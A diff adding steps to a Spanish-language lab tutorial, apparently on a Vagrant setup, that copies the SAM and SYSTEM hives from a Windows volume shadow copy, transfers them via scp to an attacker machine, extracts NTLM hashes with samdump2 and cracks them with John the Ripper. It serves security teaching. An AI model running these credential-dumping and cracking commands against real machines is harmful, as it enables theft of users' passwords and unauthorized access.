@@ -191,6 +191,8 @@ Esto nos tiene que mostrar la lista como esta en la siguiente imagen
 
 ![LISTA DE COMANDOS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781463610/Lista_de_comandos_f7rhex.png)
 
+## 5.4 Ejecuta el script vssown.vbs
+
 En este punto los comando que usaremos en seguida seran los siguientes:
 
 ```
@@ -204,7 +206,88 @@ Usando los comandos en orden se tendria el siguiente resultado
 
 ![COMANDO A USAR](https://res.cloudinary.com/dopcqb8wn/image/upload/v1782469184/comandos_a_usar_gtjvgu.png)
 
+## 5.5 Copiamos los archivos SAM y SYSTEM
 
+Ahora que tenemos la ruta a la copia del volumen shadow, entramos en el modo cmd de la maquina victima:
+
+```
+ssh vagrant@10.0.2.3
+
+-sh-4.3$ cmd
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\User\vagrant>cd C:\\Users\\vagrant\\Downloads
+C:\Users\vagrant\Downloads>
+```
+
+![ENTRANDO AL CMD](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781472120/Copia_de_SAM_y_SYSTEM_pqys0g.png)
+
+Una vez que estemos en la carpeta donde esta el archivo que pusimos en la victima, ejecutamos las siguientes lineas:
+
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM
+```
+y
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
+```
+Usamos unos despues del otro, nos deberia quedar asi:
+
+![COPIADO DE SAM Y SYSTEM](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781472449/Copia_de_SAM_y_SYSTEM_2_wr3fon.png)
+
+Ahora salimos del modo cmd
+
+```
+C:\Users\vagrant\Downloads>exit
+exit
+```
+
+# 6 TRANSFERIR LOS ARCHIVOS SAM Y SYSTEM AL ATACANTE
+
+Una vez que salimos del cmd de la maquina victima, ejecutamos la linea `-sh-4.3$ pwd` para saber cual es la ruta real de los archivos que copiamos.
+
+![RUTA REAL DE ARCHIVOS COPIADOS DE SAM Y SYSTEM](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781472806/ruta_real_px0toz.png)
+
+Ahora que sabemos la ruta de mis archivos copiados, procedemos a extraerlos con el comando SCP.
+
+Usaremos los siguientes comandos a presentación:
+
+```
+scp vagrant@10.0.2.3:/cygdrive/c/Users/vagrant/Downloads/SAM .
+```
+Y
+```
+scp vagrant@10.0.2.3:/cygdrive/c/Users/vagrant/Downloads/SYSTEM .
+```
+
+Con ello obtendremos la copia en mi maquina atacante, asi como se muestra:
+
+![TRANSFERENCIA DE SAM Y SYSTEM](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781473429/SAM_Y_SYSTEM_TRANSFERIDOS_mnxg7m.png)
+
+# 7 EXTRACCIÖN DE HASHES
+
+Con los archivos SAM y SYSTEM en la máquina atacante, usaremos la herramienta samdumo2 junto con John the Ripper o Hashcat para extraer y crackear los haches.
+
+Al ejecutar el comando samdump2 SYSTEM SAM > hashes.txt, la herramienta procesa ambos archivos, extrae los hashes y guarda el resultado en el archivo hashes.txt. Esta información puede utilizarse posteriormente para realizar análisis de seguridad o auditorías de contraseñas mediante herramientas especializadas.
+
+![SAMDUMP2](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781474253/SAMDUMP2_SAM_Y_SYSTEM_lvkhyb.png)
+
+Ahora nos toca eliminar el archivo __~/.john/john.pot__, donde John the Ripper guarda las contraseñas encontradas.
+
+![GUARDADO DE CONTRASEÑAS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781475225/Guardar_las_contraseñas_encontradas_stduwc.png)
+
+Despues haremos el Crakeo de los Hashes usando John the Ripper (siguiente comando)
+
+```
+john --format=NT --Wordlist=~/Downloads/rockyou.txt hashes.txt --fork=4
+```
+
+Resultando en esto:
+
+![CONTRASEÑAS ENCONTRADAS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1781475825/contraseñas_encontradas_ylgfcm.png)
+
+John the Ripper logró recuperar varias contraseñas a partir de los hashes NTLM contenidos en hashes.txt.
 
 
 
